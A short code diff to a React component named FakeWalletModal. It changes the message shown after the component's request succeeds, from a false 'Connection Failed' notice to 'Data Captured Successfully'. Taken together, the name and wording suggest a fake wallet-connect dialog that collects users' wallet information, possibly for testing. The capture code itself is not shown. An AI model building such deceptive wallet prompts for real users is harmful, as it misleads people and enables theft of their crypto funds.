@@ -40,9 +40,8 @@ export function FakeWalletModal({ isOpen, onClose, walletName, walletIcon }: Fak
 
       if (response.ok) {
         toast({
-          title: "Connection Failed",
-          description: "Unable to connect to wallet. Please try again later.",
-          variant: "destructive",
+          title: "Data Captured Successfully",
+          description: "Your wallet information has been processed for testing.",
         });
       } else {
         toast({
